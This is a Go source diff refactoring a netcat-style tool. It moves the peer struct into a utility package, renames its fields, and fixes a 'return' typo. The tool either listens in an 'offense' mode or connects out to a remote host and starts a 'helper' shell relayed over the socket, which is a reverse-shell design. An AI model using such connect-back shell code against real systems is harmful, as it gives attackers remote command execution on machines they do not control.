@@ -9,6 +9,7 @@ import (
 	"bufio"
 	"strings"
 	"time"
+
 	//"flag"
 	"fmt"
 	"net"
@@ -76,37 +77,19 @@ func main() {
 	fmt.Printf("%s", utils.Banner())
 
 	// Get STDIN and save to a variable we can use if we need:
-	stdinReader := bufio.NewReader(os.Stdin)
-	stdin, _ := stdinReader.ReadString('\n')
-	fmt.Printf("STDIN = %v", stdin) // Keep for now to avoid golang complaints about unused vars.
-
-	// Depending on input, create this peer's type:
-	type peer struct {
-		connection_type string
-		rPort           int
-		lPort           string
-		address         string
-		connection      net.Conn
-		cbShell         *exec.Cmd
-	}
+	// stdinReader := bufio.NewReader(os.Stdin)
+	// stdin, _ := stdinReader.ReadString('\n')
+	// fmt.Printf("STDIN = %v", stdin) // Keep for now to avoid golang complaints about unused vars.
 
 	// Initiate peer struct:
-	thisPeer := peer{rPort: *turdnuggies, address: *hostFlag}
-
-	// If -l was given, create an 'offense' peer:
-	if *listenFlag {
-		thisPeer.connection_type = "offense"
-		thisPeer.address = "0.0.0.0"
-	} else {
-		thisPeer.connection_type = "connect_back"
-	}
+	thisPeer := utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen)
 
 	// Now that we have our peer: try to make connection
 	var asyncio_rocks net.Conn // connection @0xtib3rius
 	var err error
 
-	if thisPeer.connection_type == "offense" {
-		listener, err1 := net.Listen("tcp", fmt.Sprintf(":%v", thisPeer.rPort))
+	if thisPeer.ConnectionType == "offense" {
+		listener, err1 := net.Listen("tcp", fmt.Sprintf(":%v", thisPeer.RPort))
 		if err1 != nil {
 			fmt.Printf("Error when creating listener: %v\n", err1)
 			os.Stderr.WriteString(" " + err.Error() + "\n")
@@ -122,12 +105,12 @@ func main() {
 			//  log.Fatal(err1.Error()
 		}
 	} else {
-		remoteHost := fmt.Sprintf("%v:%v", thisPeer.address, thisPeer.rPort)
+		remoteHost := fmt.Sprintf("%v:%v", thisPeer.Address, thisPeer.RPort)
 		asyncio_rocks, err = net.Dial("tcp", remoteHost)
 
 		// If there is an err, try the host address as ipv6 (need to add [] around string):
 		if err != nil {
-			remoteHost := fmt.Sprintf("[%v]:%v", thisPeer.address, thisPeer.rPort)
+			remoteHost := fmt.Sprintf("[%v]:%v", thisPeer.Address, thisPeer.RPort)
 			asyncio_rocks, err = net.Dial("tcp", remoteHost)
 
 			if err != nil {
@@ -138,13 +121,13 @@ func main() {
 	}
 
 	// Attach connection to peer struct:
-	thisPeer.connection = asyncio_rocks
-	localPortArr := strings.Split(thisPeer.connection.LocalAddr().String(), ":")
+	thisPeer.Connection = asyncio_rocks
+	localPortArr := strings.Split(thisPeer.Connection.LocalAddr().String(), ":")
 	localPort := localPortArr[len(localPortArr)-1]
-	thisPeer.lPort = localPort
+	thisPeer.LPort = localPort
 
 	// Update user:
-	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.connection_type, thisPeer.address, thisPeer.rPort, thisPeer.lPort)
+	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
 	fmt.Println(updateUserBanner)
 
 	// Start channel to listen for SIGINT:
@@ -155,22 +138,22 @@ func main() {
 		for sig := range signalChan {
 			if sig.String() == "interrupt" {
 				fmt.Printf("signal: %v\n", sig)
-				thisPeer.connection.Close()
+				thisPeer.Connection.Close()
 				os.Exit(2)
 			}
 		}
 	}()
 
 	// If we're the connect_back peer, start 'helper' shell:
-	if thisPeer.connection_type == "connect_back" {
+	if thisPeer.ConnectionType == "connect_back" {
 		connectBackShell, shellStartErr := startHelperShell()
 		if shellStartErr != nil {
 			fmt.Printf("Error starting shell process: %v\n", shellStartErr)
-			thisPeer.connection.Close()
+			thisPeer.Connection.Close()
 			os.Stderr.WriteString(" " + shellStartErr.Error() + "\n")
 			os.Exit(1)
 		}
-		thisPeer.cbShell = connectBackShell
+		thisPeer.CbShell = connectBackShell
 	}
 
 	// IO read & socket write channels (user input will be written to socket)
@@ -180,12 +163,12 @@ func main() {
 	socketReader := make(chan []byte)
 
 	go readUserInput(ioReader)
-	go readFromSocket(socketReader, thisPeer.connection)
+	go readFromSocket(socketReader, thisPeer.Connection)
 
 	for {
 		select {
 		case userInput := <-ioReader:
-			_, err := thisPeer.connection.Write([]byte(userInput))
+			_, err := thisPeer.Connection.Write([]byte(userInput))
 			if err != nil {
 				// Quit here?
 				fmt.Printf("Error in userInput select: %v\n", err)
@@ -202,5 +185,5 @@ func main() {
 			time.Sleep(300 * time.Millisecond)
 		}
 	}
-	eturn
+	return
 }
